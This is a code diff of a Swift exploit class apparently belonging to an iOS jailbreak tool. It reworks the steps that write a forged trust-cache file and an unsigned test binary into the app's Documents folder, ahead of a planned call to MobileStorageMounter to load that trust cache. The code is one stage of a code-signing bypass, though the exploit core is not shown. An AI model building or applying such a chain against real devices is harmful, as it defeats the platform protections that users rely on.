@@ -84,27 +84,32 @@ final class ExpMSMTrustCacheLoad {
         log("")
         
         // Step 2: Write trust cache to filesystem
-        log("── Step 2: Write TC file to /var/jb/tmp/ ──")
-        let tcPath = "/var/jb/tmp/dsploit_tc.bin"
-        let writeOk = writeTCFile(data: tcData, path: tcPath)
-        if !writeOk {
-            log("❌ Failed to write TC file")
-            log("   Try: ensure jailbreak is active and /var/jb/tmp exists")
+        log("── Step 2: Write TC file ──")
+        // Use app's own Documents folder (always writable, no sandbox issue)
+        let docsPath = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
+        let tcPath = docsPath + "/dsploit_tc.bin"
+        let testBinPath = docsPath + "/msm_test_bin"
+        
+        do {
+            try tcData.write(to: URL(fileURLWithPath: tcPath))
+            log("✅ TC file written to \(tcPath)")
+        } catch {
+            log("❌ Failed to write TC file: \(error.localizedDescription)")
             return results
         }
-        log("✅ TC file written to \(tcPath)")
         log("")
         
         // Step 3: Write test binary
         log("── Step 3: Write unsigned test binary ──")
-        let testBinPath = "/var/jb/tmp/msm_test_bin"
         let testBin = buildTestBinary()
-        let binOk = writeTestBinary(data: testBin, path: testBinPath)
-        if !binOk {
-            log("❌ Failed to write test binary")
+        do {
+            try testBin.write(to: URL(fileURLWithPath: testBinPath))
+            // chmod via RC later
+            log("✅ Test binary written (\(testBin.count) bytes)")
+        } catch {
+            log("❌ Failed to write test binary: \(error.localizedDescription)")
             return results
         }
-        log("✅ Test binary written (\(testBin.count) bytes)")
         log("")
         
         // Step 4: Connect to MobileStorageMounter via RC
